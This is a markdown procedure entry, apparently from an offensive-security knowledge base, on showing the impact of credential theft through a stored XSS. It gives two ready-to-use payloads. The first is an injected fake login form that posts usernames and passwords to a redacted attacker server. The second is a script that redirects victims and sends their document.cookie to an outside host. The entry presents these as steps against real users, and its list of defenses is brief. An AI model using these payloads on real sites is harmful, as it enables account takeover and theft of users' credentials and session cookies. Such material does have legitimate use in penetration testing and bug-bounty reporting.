---
id: proc-demonstrate-credential-theft
tags:
  - xss
  - credential-theft
  - phishing
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Adversary-in-the-Middle]]'
updated_at: '2025-12-14T17:33:06.163Z'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Adversary-in-the-Middle]]'
---
# Demonstrate-Credential-Theft-Impact

## Summary

Deploys advanced payloads to steal credentials or takeover accounts via the stored XSS.

## Description

Uses phishing forms or redirects for exfil. No filters block; enables real attacks on DoD users.

## Requirements

1. Triggered XSS execution
2. Attacker-controlled server for exfil
3. Payload crafting knowledge

## Defense

- User training on suspicious forms
- Network monitoring for exfil traffic
- Endpoint detection for JS anomalies

## Objectives

1. Capture credentials
2. Demonstrate takeover
3. Highlight impact

## Instructions

### Step 1: Deploy Phishing Payload

**Context**: Inject form for credential capture.

```html
<h3>Please login to proceed</h3> <form action=http://██████>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Logon"></br>
```

> Form appears on view. Expected: Submissions to attacker server.

### Step 2: Test Cookie Exfil

**Context**: Redirect with cookies.

```html
<script>window.location="http://███/?cookie=" + document.cookie</script>
```

> Redirects. Expected: Cookies appended to URL (unauth limits full test).

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[JavaScript]]
- [[Adversary-in-the-Middle]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[credential-theft]]
- [[Phishing]]
